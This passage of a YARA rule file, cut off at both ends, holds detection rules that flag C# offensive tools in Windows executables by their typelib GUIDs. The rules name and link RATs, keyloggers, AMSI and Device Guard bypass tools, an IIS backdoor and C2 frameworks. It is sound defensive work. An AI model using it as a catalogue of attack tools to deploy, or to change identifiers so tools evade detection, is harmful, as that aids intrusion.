them\n}\n\nrule HKTL_NET_GUID_rat_shell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/stphivos/rat-shell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"7a15f8f6-6ce2-4ca4-919d-2056b70cc76a\" ascii nocase wide\n        $typelibguid1 = \"1659d65d-93a8-4bae-97d5-66d738fc6f6c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_dotnet_gargoyle {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/countercept/dotnet-gargoyle\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"76435f79-f8af-4d74-8df5-d598a551b895\" ascii nocase wide\n        $typelibguid1 = \"5a3fc840-5432-4925-b5bc-abc536429cb5\" ascii nocase wide\n        $typelibguid2 = \"6f0bbb2a-e200-4d76-b8fa-f93c801ac220\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_aresskit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/BlackVikingPro/aresskit\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8dca0e42-f767-411d-9704-ae0ba4a44ae8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DLL_Injector {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tmthrgd/DLL-Injector\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4581a449-7d20-4c59-8da2-7fd830f1fd5e\" ascii nocase wide\n        $typelibguid1 = \"05f4b238-25ce-40dc-a890-d5bbb8642ee4\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_TruffleSnout {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/dsnezhkov/TruffleSnout\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"33842d77-bce3-4ee8-9ee2-9769898bb429\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Anti_Analysis {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Anti-Analysis\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"3092c8df-e9e4-4b75-b78e-f81a0058a635\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BackNet {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/valsov/BackNet\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"9fdae122-cd1e-467d-a6fa-a98c26e76348\" ascii nocase wide\n        $typelibguid1 = \"243c279e-33a6-46a1-beab-2864cc7a499f\" ascii nocase wide\n        $typelibguid2 = \"a7301384-7354-47fd-a4c5-65b74e0bbb46\" ascii nocase wide\n        $typelibguid3 = \"982dc5b6-1123-428a-83dd-d212490c859f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AllTheThings {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/johnjohnsp1/AllTheThings\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"0547ff40-5255-42a2-beb7-2ff0dbf7d3ba\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AddReferenceDotRedTeam {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ceramicskate0/AddReferenceDotRedTeam\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"73c79d7e-17d4-46c9-be5a-ecef65b924e4\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Lime_Crypter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Lime-Crypter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"f93c99ed-28c9-48c5-bb90-dd98f18285a6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BrowserGhost {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/QAX-A-Team/BrowserGhost\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"2133c634-4139-466e-8983-9a23ec99e01b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpShot {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tothi/SharpShot\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"057aef75-861b-4e4b-a372-cfbd8322c8e1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Offensive__NET {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mrjamiebowman/Offensive-.NET\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"11fe5fae-b7c1-484a-b162-d5578a802c9c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_RuralBishop {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/RuralBishop\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"fe4414d9-1d7e-4eeb-b781-d278fe7a5619\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DeviceGuardBypasses {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tyranid/DeviceGuardBypasses\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"f318466d-d310-49ad-a967-67efbba29898\" ascii nocase wide\n        $typelibguid1 = \"3705800f-1424-465b-937d-586e3a622a4f\" ascii nocase wide\n        $typelibguid2 = \"256607c2-4126-4272-a2fa-a1ffc0a734f0\" ascii nocase wide\n        $typelibguid3 = \"4e6ceea1-f266-401c-b832-f91432d46f42\" ascii nocase wide\n        $typelibguid4 = \"1e6e9b03-dd5f-4047-b386-af7a7904f884\" ascii nocase wide\n        $typelibguid5 = \"d85e3601-0421-4efa-a479-f3370c0498fd\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AMSI_Handler {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/two06/AMSI_Handler\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"d829426c-986c-40a4-8ee2-58d14e090ef2\" ascii nocase wide\n        $typelibguid1 = \"86652418-5605-43fd-98b5-859828b072be\" ascii nocase wide\n        $typelibguid2 = \"1043649f-18e1-41c4-ae8d-ac4d9a86c2fc\" ascii nocase wide\n        $typelibguid3 = \"1d920b03-c537-4659-9a8c-09fb1d615e98\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_RAT_TelegramSpyBot {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SebastianEPH/RAT.TelegramSpyBot\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8653fa88-9655-440e-b534-26c3c760a0d3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_TheHackToolBoxTeek {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/teeknofil/TheHackToolBoxTeek\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"2aa8c254-b3b3-469c-b0c9-dcbe1dd101c0\" ascii nocase wide\n        $typelibguid1 = \"afeff505-14c1-4ecf-b714-abac4fbd48e7\" ascii nocase wide\n        $typelibguid2 = \"4cf42167-a5cf-4b2d-85b4-8e764c08d6b3\" ascii nocase wide\n        $typelibguid3 = \"118a90b7-598a-4cfc-859e-8013c8b9339c\" ascii nocase wide\n        $typelibguid4 = \"3075dd9a-4283-4d38-a25e-9f9845e5adcb\" ascii nocase wide\n        $typelibguid5 = \"295655e8-2348-4700-9ebc-aa57df54887e\" ascii nocase wide\n        $typelibguid6 = \"74efe601-9a93-46c3-932e-b80ab6570e42\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_USBTrojan {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mashed-potatoes/USBTrojan\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4eee900e-adc5-46a7-8d7d-873fd6aea83e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_IIS_backdoor {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/WBGlIl/IIS_backdoor\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"3fda4aa9-6fc1-473f-9048-7edc058c4f65\" ascii nocase wide\n        $typelibguid1 = \"73ca4159-5d13-4a27-8965-d50c41ab203c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ShellGen {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jasondrawdy/ShellGen\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"c6894882-d29d-4ae1-aeb7-7d0a9b915013\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Mass_RAT {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Mass-RAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"6c43a753-9565-48b2-a372-4210bb1e0d75\" ascii nocase wide\n        $typelibguid1 = \"92ba2a7e-c198-4d43-929e-1cfe54b64d95\" ascii nocase wide\n        $typelibguid2 = \"4cb9bbee-fb92-44fa-a427-b7245befc2f3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Browser_ExternalC2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mdsecactivebreach/Browser-ExternalC2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"10a730cd-9517-42d5-b3e3-a2383515cca9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_OffensivePowerShellTasking {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/leechristensen/OffensivePowerShellTasking\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"d432c332-3b48-4d06-bedb-462e264e6688\" ascii nocase wide\n        $typelibguid1 = \"5796276f-1c7a-4d7b-a089-550a8c19d0e8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DoHC2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SpiderLabs/DoHC2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"9877a948-2142-4094-98de-e0fbb1bc4062\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SyscallPOC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SolomonSklash/SyscallPOC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"1e54637b-c887-42a9-af6a-b4bd4e28cda9\" ascii nocase wide\n        $typelibguid1 = \"198d5599-d9fc-4a74-87f4-5077318232ad\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Pen_Test_Tools {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/awillard1/Pen-Test-Tools\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"922e7fdc-33bf-48de-bc26-a81f85462115\" ascii nocase wide\n        $typelibguid1 = \"ad5205dd-174d-4332-96d9-98b076d6fd82\" ascii nocase wide\n        $typelibguid2 = \"b67e7550-f00e-48b3-ab9b-4332b1254a86\" ascii nocase wide\n        $typelibguid3 = \"5e95120e-b002-4495-90a1-cd3aab2a24dd\" ascii nocase wide\n        $typelibguid4 = \"295017f2-dc31-4a87-863d-0b9956c2b55a\" ascii nocase wide\n        $typelibguid5 = \"abbaa2f7-1452-43a6-b98e-10b2c8c2ba46\" ascii nocase wide\n        $typelibguid6 = \"a4043d4c-167b-4326-8be4-018089650382\" ascii nocase wide\n        $typelibguid7 = \"51abfd75-b179-496e-86db-62ee2a8de90d\" ascii nocase wide\n        $typelibguid8 = \"a06da7f8-f87e-4065-81d8-abc33cb547f8\" ascii nocase wide\n        $typelibguid9 = \"ee510712-0413-49a1-b08b-1f0b0b33d6ef\" ascii nocase wide\n        $typelibguid10 = \"9780da65-7e25-412e-9aa1-f77d828819d6\" ascii nocase wide\n        $typelibguid11 = \"7913fe95-3ad5-41f5-bf7f-e28f080724fe\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_The_Collection {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Tlgyt/The-Collection\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"579159ff-3a3d-46a7-b069-91204feb21cd\" ascii nocase wide\n        $typelibguid1 = \"5b7dd9be-c8c3-4c4f-a353-fefb89baa7b3\" ascii nocase wide\n        $typelibguid2 = \"43edcb1f-3098-4a23-a7f2-895d927bc661\" ascii nocase wide\n        $typelibguid3 = \"5f19919d-cd51-4e77-973f-875678360a6f\" ascii nocase wide\n        $typelibguid4 = \"17fbc926-e17e-4034-ba1b-fb2eb57f5dd3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Change_Lockscreen {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nccgroup/Change-Lockscreen\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"78642ab3-eaa6-4e9c-a934-e7b0638bc1cc\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_LOLBITS {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Kudaes/LOLBITS\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"29d09aa4-ea0c-47c2-973c-1d768087d527\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Keylogger {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/BlackVikingPro/Keylogger\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"7afbc9bf-32d9-460f-8a30-35e30aa15879\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CVE_2020_1337 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/neofito/CVE-2020-1337\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"d9c2e3c1-e9cc-42b0-a67c-b6e1a4f962cc\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpLogger {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/djhohnstein/SharpLogger\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"36e00152-e073-4da8-aa0c-375b6dd680c4\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AsyncRAT_C_Sharp {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"619b7612-dfea-442a-a927-d997f99c497b\" ascii nocase wide\n        $typelibguid1 = \"424b81be-2fac-419f-b4bc-00ccbe38491f\" ascii nocase wide\n        $typelibguid2 = \"37e20baf-3577-4cd9-bb39-18675854e255\" ascii nocase wide\n        $typelibguid3 = \"dafe686a-461b-402b-bbd7-2a2f4c87c773\" ascii nocase wide\n        $typelibguid4 = \"ee03faa9-c9e8-4766-bd4e-5cd54c7f13d3\" ascii nocase wide\n        $typelibguid5 = \"8bfc8ed2-71cc-49dc-9020-2c8199bc27b6\" ascii nocase wide\n        $typelibguid6 = \"d640c36b-2c66-449b-a145-eb98322a67c8\" ascii nocase wide\n        $typelibguid7 = \"8de42da3-be99-4e7e-a3d2-3f65e7c1abce\" ascii nocase wide\n        $typelibguid8 = \"bee88186-769a-452c-9dd9-d0e0815d92bf\" ascii nocase wide\n        $typelibguid9 = \"9042b543-13d1-42b3-a5b6-5cc9ad55e150\" ascii nocase wide\n        $typelibguid10 = \"6aa4e392-aaaf-4408-b550-85863dd4baaf\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DarkFender {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xyg3n/DarkFender\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"12fdf7ce-4a7c-41b6-9b32-766ddd299beb\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\n/* FPs with IronPython\nrule HKTL_NET_GUID_IronKit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nshalabi/IronKit\"\n        author = \"Arnim Rupp\"\n        score = 50\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"68e40495-c34a-4539-b43e-9e4e6f11a9fb\" ascii nocase wide\n        $typelibguid1 = \"641cd52d-3886-4a74-b590-2a05621502a4\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n*/\n\nrule HKTL_NET_GUID_MinerDropper {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/DylanAlloy/MinerDropper\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"46a7af83-1da7-40b2-9d86-6fd6223f6791\" ascii nocase wide\n        $typelibguid1 = \"8433a693-f39d-451b-955b-31c3e7fa6825\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpDomainSpray {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/HunnicCyber/SharpDomainSpray\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"76ffa92b-429b-4865-970d-4e7678ac34ea\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_iSpyKeylogger {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mwsrc/iSpyKeylogger\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"ccc0a386-c4ce-42ef-aaea-b2af7eff4ad8\" ascii nocase wide\n        $typelibguid1 = \"816b8b90-2975-46d3-aac9-3c45b26437fa\" ascii nocase wide\n        $typelibguid2 = \"279b5533-d3ac-438f-ba89-3fe9de2da263\" ascii nocase wide\n        $typelibguid3 = \"88d3dc02-2853-4bf0-b6dc-ad31f5135d26\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SolarFlare {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mubix/solarflare\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-15\"\n    strings:\n        $typelibguid0 = \"ca60e49e-eee9-409b-8d1a-d19f1d27b7e4\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Snaffler {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SnaffCon/Snaffler\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"2aa060b4-de88-4d2a-a26a-760c1cefec3e\" ascii nocase wide\n        $typelibguid1 = \"b118802d-2e46-4e41-aac7-9ee890268f8b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpShares {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/djhohnstein/SharpShares/\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"fe9fdde5-3f38-4f14-8c64-c3328c215cf2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpEDRChecker {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/PwnDexter/SharpEDRChecker\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-18\"\n    strings:\n        $typelibguid0 = \"bdfee233-3fed-42e5-aa64-492eb2ac7047\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpClipHistory {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FSecureLABS/SharpClipHistory\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"1126d5b4-efc7-4b33-a594-b963f107fe82\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpGPO_RemoteAccessPolicies {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FSecureLABS/SharpGPO-RemoteAccessPolicies\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"fbb1abcf-2b06-47a0-9311-17ba3d0f2a50\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Absinthe {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cameronhotchkies/Absinthe\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"9936ae73-fb4e-4c5e-a5fb-f8aaeb3b9bd6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ExploitRemotingService {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tyranid/ExploitRemotingService\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"fd17ae38-2fd3-405f-b85b-e9d14e8e8261\" ascii nocase wide\n        $typelibguid1 = \"1850b9bb-4a23-4d74-96b8-58f274674566\" ascii nocase wide\n        $typelibguid2 = \"297cbca1-efa3-4f2a-8d5f-e1faf02ba587\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Xploit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/shargon/Xploit\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"4545cfde-9ee5-4f1b-b966-d128af0b9a6e\" ascii nocase wide\n        $typelibguid1 = \"33849d2b-3be8-41e8-a1e2-614c94c4533c\" ascii nocase wide\n        $typelibguid2 = \"c2dc73cc-a959-4965-8499-a9e1720e594b\" ascii nocase wide\n        $typelibguid3 = \"77059fa1-4b7d-4406-bc1a-cb261086f915\" ascii nocase wide\n        $typelibguid4 = \"a4a04c4d-5490-4309-9c90-351e5e5fd6d1\" ascii nocase wide\n        $typelibguid5 = \"ca64f918-3296-4b7d-9ce6-b98389896765\" ascii nocase wide\n        $typelibguid6 = \"10fe32a0-d791-47b2-8530-0b19d91434f7\" ascii nocase wide\n        $typelibguid7 = \"679bba57-3063-4f17-b491-4f0a730d6b02\" ascii nocase wide\n        $typelibguid8 = \"0981e164-5930-4ba0-983c-1cf679e5033f\" ascii nocase wide\n        $typelibguid9 = \"2a844ca2-5d6c-45b5-963b-7dca1140e16f\" ascii nocase wide\n        $typelibguid10 = \"7d75ca11-8745-4382-b3eb-c41416dbc48c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PoC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/thezdi/PoC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"89f9d411-e273-41bb-8711-209fd251ca88\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpGPOAbuse {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FSecureLABS/SharpGPOAbuse\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = 